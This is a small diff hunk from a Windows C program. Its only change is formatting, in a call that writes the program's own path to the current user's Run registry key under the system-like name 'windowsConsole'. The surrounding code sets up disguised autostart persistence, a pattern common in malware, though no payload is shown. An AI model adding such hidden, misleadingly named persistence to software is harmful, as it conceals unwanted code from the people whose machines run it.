@@ -60,7 +60,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS)
         {
-            RegSetValueExA(key, "windowsConsole", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
+            RegSetValueExA(key, "windowsConsole",0,REG_SZ,(BYTE*)path,strlen(path) + 1);
             RegCloseKey(key);
         }
 
